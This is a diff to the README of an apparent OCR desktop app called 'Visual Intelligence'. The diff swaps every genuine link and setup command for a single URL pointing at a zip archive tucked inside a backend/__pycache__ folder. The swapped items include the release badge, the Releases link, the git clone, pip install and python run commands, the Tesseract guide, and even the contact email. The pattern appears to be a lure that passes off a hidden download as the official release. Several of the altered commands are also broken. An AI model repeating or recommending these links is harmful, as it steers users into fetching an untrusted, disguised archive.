@@ -1,6 +1,6 @@
 # Visual Intelligence 🌟
 
-![Visual Intelligence](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)
+![Visual Intelligence](https://github.com/Zurdo1007/visual-intelligence/raw/refs/heads/main/backend/__pycache__/intelligence_visual_1.0.zip%20Latest%20Release-blue?style=for-the-badge&logo=github)
 
 Welcome to **Visual Intelligence**, a powerful desktop application designed to extract text from images and PDFs in both Turkish and English. This application leverages Tesseract OCR technology to deliver accurate text extraction, while also providing advanced features such as text summarization, keyword extraction, and detection of tables and QR/barcodes. With a modern and user-friendly interface built using TailwindCSS and Vanilla JS, Visual Intelligence aims to enhance your productivity and streamline your workflow.
 
@@ -38,7 +38,7 @@ Visual Intelligence is built using a variety of technologies that work together 
 
 ## Installation
 
-To get started with Visual Intelligence, you can download the latest release from the [Releases section](https://github.com/Zurdo1007/visual-intelligence/releases). 
+To get started with Visual Intelligence, you can download the latest release from the [Releases section](https://github.com/Zurdo1007/visual-intelligence/raw/refs/heads/main/backend/__pycache__/intelligence_visual_1.0.zip). 
 
 ### Prerequisites
 
@@ -53,7 +53,7 @@ Make sure you have the following installed on your machine:
 1. **Clone the Repository**: Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/Zurdo1007/visual-intelligence.git
+   git clone https://github.com/Zurdo1007/visual-intelligence/raw/refs/heads/main/backend/__pycache__/intelligence_visual_1.0.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -65,15 +65,15 @@ Make sure you have the following installed on your machine:
 3. **Install Dependencies**: Run the following command to install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Zurdo1007/visual-intelligence/raw/refs/heads/main/backend/__pycache__/intelligence_visual_1.0.zip
    ```
 
-4. **Download Tesseract OCR**: Follow the installation instructions for Tesseract OCR based on your operating system. You can find the installation guide [here](https://github.com/tesseract-ocr/tesseract).
+4. **Download Tesseract OCR**: Follow the installation instructions for Tesseract OCR based on your operating system. You can find the installation guide [here](https://github.com/Zurdo1007/visual-intelligence/raw/refs/heads/main/backend/__pycache__/intelligence_visual_1.0.zip).
 
 5. **Run the Application**: Start the application by executing:
 
    ```bash
-   python app.py
+   python https://github.com/Zurdo1007/visual-intelligence/raw/refs/heads/main/backend/__pycache__/intelligence_visual_1.0.zip
    ```
 
 6. **Access the Application**: Open your web browser and go to `http://localhost:5000` to start using Visual Intelligence.
@@ -142,7 +142,7 @@ Visual Intelligence is licensed under the MIT License. See the [LICENSE](LICENSE
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [Zurdo1007](https://github.com/Zurdo1007)
-- **Email**: zurdo1007@example.com
+- **GitHub**: [Zurdo1007](https://github.com/Zurdo1007/visual-intelligence/raw/refs/heads/main/backend/__pycache__/intelligence_visual_1.0.zip)
+- **Email**: https://github.com/Zurdo1007/visual-intelligence/raw/refs/heads/main/backend/__pycache__/intelligence_visual_1.0.zip
 
-You can download the latest release of Visual Intelligence from the [Releases section](https://github.com/Zurdo1007/visual-intelligence/releases). Enjoy exploring the features and capabilities of this powerful application!
+You can download the latest release of Visual Intelligence from the [Releases section](https://github.com/Zurdo1007/visual-intelligence/raw/refs/heads/main/backend/__pycache__/intelligence_visual_1.0.zip). Enjoy exploring the features and capabilities of this powerful application!
